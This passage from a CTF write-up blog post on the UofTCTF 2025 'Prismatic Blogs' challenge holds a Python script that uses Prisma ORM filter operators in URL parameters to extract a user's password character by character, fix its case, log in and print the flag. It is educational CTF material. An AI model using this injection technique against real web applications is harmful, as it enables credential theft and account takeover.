<span class="kn">import</span> <span class="n">re</span>

<span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="nf">critical</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;USERNAME&gt;</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">exit</span><span class="p">()</span>

<span class="c1"># Set of character used (read the seeder.js file)
# But since it's case unsensitive we don't have to check for a and A b and B ...
</span><span class="n">chars</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="sh">"</span>
<span class="n">numbers</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0123456789</span><span class="sh">"</span>

<span class="c1"># The username to attack four users
</span><span class="n">username</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">passw</span> <span class="o">=</span> <span class="sh">""</span>

<span class="n">log</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sh">"</span><span class="s">Gathering password WITHOUT case-sensitivity</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">'</span><span class="s">Bruteforcing (case-unsensitive)</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># We know that the password is maximum 24 char (see seeder.js)
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
    <span class="c1"># Go through every possible char of the set of character
</span>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
    
    	<span class="c1"># Make &amp; Request the url
</span>        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][startsWith]=</span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span> 
        <span class="n">req</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>    
    
    	<span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="o">+</span><span class="n">char</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    	<span class="c1"># If something is returned, that means that it's the correct char
</span>        <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
            <span class="n">passw</span> <span class="o">+=</span> <span class="n">char</span>
            <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL (CASE-UNSENSITIVE): </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">passw</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">break</span>


<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Gathering case ...</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">'</span><span class="s">Identifying case</span><span class="sh">'</span><span class="p">)</span>
<span class="n">to_test</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">passw</span><span class="p">:</span>
    <span class="nf">if</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">):</span>
        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span>
        <span class="k">continue</span>

    <span class="n">is_lower_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/posts?author[name]=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;author[password][gt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">a&amp;author[password][lt]=</span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="s">z</span><span class="sh">"</span>
    <span class="n">is_lower</span> <span class="o">=</span> <span class="nf">get</span><span class="p">(</span><span class="n">is_lower_url</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying : </span><span class="si">{</span><span class="n">to_test</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>


    <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">is_lower</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">posts</span><span class="sh">"</span><span class="p">]))</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>
        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">to_test</span> <span class="o">+=</span> <span class="n">char</span><span class="p">.</span><span class="nf">upper</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">trying: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">to_test</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">FINAL (CASE-SENSITIVE): </span><span class="sh">"</span> <span class="o">+</span> <span class="n">passw</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">searching flag in </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="sh">'</span><span class="s">s posts</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Login to the /api/login endpoint
</span><span class="n">res</span> <span class="o">=</span> <span class="nf">post</span><span class="p">(</span>
	<span class="n">url</span><span class="o">=</span><span class="sh">"</span><span class="s">http://35.239.207.1:3000/api/login</span><span class="sh">"</span><span class="p">,</span> 
	<span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="p">},</span>
	<span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">to_test</span><span class="p">}</span>
<span class="p">).</span><span class="n">text</span>

<span class="c1"># Grab the flag
</span><span class="nf">if</span><span class="p">(</span><span class="sh">"</span><span class="s">The Flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">):</span>
	<span class="nf">print</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">"</span><span class="s">uoftctf{.*}</span><span class="sh">"</span><span class="p">,</span> <span class="n">res</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></div>  </div>
</details>

<p>It takes a user in argument, search his <strong>case unsensitive</strong> password, search the <strong>case sensitive</strong> password, <strong>login</strong> as the user and <strong>search for</strong> <code class="language-plaintext highlighter-rouge">The Flag</code> post in his posts.</p>

<p>Tried it with <code class="language-plaintext highlighter-rouge">White</code> (first username in <a href="#seedjs">seedjs</a>), but no flag was found. Then I tried it with <code class="language-plaintext highlighter-rouge">Bob</code> (second username in <a href="#seedjs">seedjs</a>) aaaand:</p>

<p><a href="/assets/img/writeups/uoftctf/flagged_web.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/uoftctf/flagged_web.png" alt="image"  loading="lazy"></a>
<em>Let’s go !</em></p>

<div file="flag.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="flag.txt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>uoftctf{u51n6_0rm5_d035_n07_m34n_1nj3c710n5_c4n7_h4pp3n}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/writeups/">Writeups</a>,
          <a href="/categories/ctftime2025/">CTFTime2025</a>,
          <a href="/categories/uoftctf2025/">UofTCTF2025</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeups/"
            class="post-tag no-text-decoration"
          >writeups</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/express/"
            class="post-tag no-text-decoration"
          >express</a>
        
          <a
            href="/tags/nosql-injection/"
            class="post-tag no-text-decoration"
          >nosql-injection</a>
        
          <a
            href="/tags/json-injection/"
            class="post-tag no-text-decoration"
          >json-injection</a>
        
          <a
            href="/tags/orm-injection/"
            class="post-tag no-text-decoration"
          >orm-injection</a>
        
          <a
            href="/tags/prisma/"
            class="post-tag no-text-decoration"
          >prisma</a>
        
          <a
            href="/tags/python-scripting/"
            class="post-tag no-text-decoration"
          >python-scripting</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=UofTCTF%20-%20Prismatic%20Blogs%20-%20NullBrunk&url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fuoftctf2025-prismatic%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=UofTCTF%20-%20Prismatic%20Blogs%20-%20NullBrunk&u=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fuoftctf2025-prismatic%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fuoftctf2025-prismatic%2F&text=UofTCTF%20-%20Prismatic%20Blogs%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

         
            <!-- panel -->
            <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
              <div class="access">
                

  <section id="toc-wrapper">
    <h2 class="panel-heading no-border">Event</h2>
    <ul class="content list-unstyled no-border ps-0 pb-1 ms-1 mt-2 toc-list ">
    
      <li class="toc-list-item">
        <a class="toc-link node-name--H2 img-link fw-600 blue-sidebar"> <i class="fa-solid fa-ranking-star mr-11-px"></i> 161 / 897  </a>
      </li>

      <li class="toc-list-item no-border">
        <a class="toc-link node-name--H2 img-link fw-600" href="https://ctftime.org/event/2570" target="_blank"> <i class="fa-solid fa-link mr-11-px"></i>Link</a>
      </li>

    </ul>
  </section>





                

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/express/">express</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/nosql-injection/">nosql-injection</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/json-injection/">json-injection</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/orm-injection/">orm-injection</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/prisma/">prisma</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/python-scripting/">python-scripting</a>
          
        </div>
      </nav>
  </section>


              </div>

              
                
                






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-1 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>

              
            </aside>
          
        </div>

        <div class="row">
          <!-- tail -->

          
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/SrdnlenCTF2025-racecondition/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737216000"
  data-df="ll"
  
>
  Jan 18, 2025
</time>

              <h4 class="pt-0 my-2">Srdnlen - Speed</h4>
              <div class="text-muted">
                <p>Enumeration
    
      Reading source code
      Interesting points
      Identifying vulnerabilities
    
  
  Exploitation
    
      Exploiting the vulnerability
      Scripting
      Getting th...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/hackday-2025-finest/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737806400"
  data-df="ll"
  
>
  Jan 25, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Finest</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Reading Source Code
      JWT Secret Key
      SQL injection
    
  
  Exploitation
    
      Understanding the JWT
      Scrip...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/pragyan-deathdaycard/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739030400"
  data-df="ll"
  
>
  Feb  8, 2025
</time>

              <h4 class="pt-0 my-2">Pragyan - Deathday Card</h4>
              <div class="text-muted">
                <p>Introduction
    
      Pragyan CTF 2025
      Description
    
  
  Enumeration
    
      Reading Source Code
      Identifying vulnerabilities
    
  
  Exploitation
    
      Verifying SSTI
  ...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/poc/">poc</a>
          
        </div>
      </nav>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

